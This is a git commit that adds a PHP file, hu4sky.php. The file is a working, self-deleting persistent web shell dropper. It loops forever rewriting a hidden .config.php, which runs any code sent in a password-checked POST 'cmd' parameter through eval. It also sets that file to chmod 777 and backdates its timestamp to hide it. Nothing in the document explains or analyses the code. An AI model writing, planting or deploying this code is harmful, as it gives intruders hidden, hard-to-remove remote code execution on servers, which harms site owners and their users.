0e6e1c10674cff0cfee92dfeb5d99aac5dda8b0d
hy234888 <791683914@qq.com>
2019-04-10 11:13:42 +0800

    origin commit -hu3sky

---
+++ hu4sky.php
@@ -0,0 +1,14 @@
+﻿<?php
+    set_time_limit(0);
+    ignore_user_abort(1);
+    unlink(__FILE__);
+    while(1){
+        file_put_contents('./.config.php','<?php
+if(md5($_POST[\'pass\'])==\'644c2afbecb8d0764c7c8a35518827c0\')
+@eval($_POST[\'cmd\']);
+?>');
+        system('chmod 777 .config.php');
+        touch("./.config.php",mktime(20,15,1,11,28,2016));
+        usleep(100);
+        }
+?>
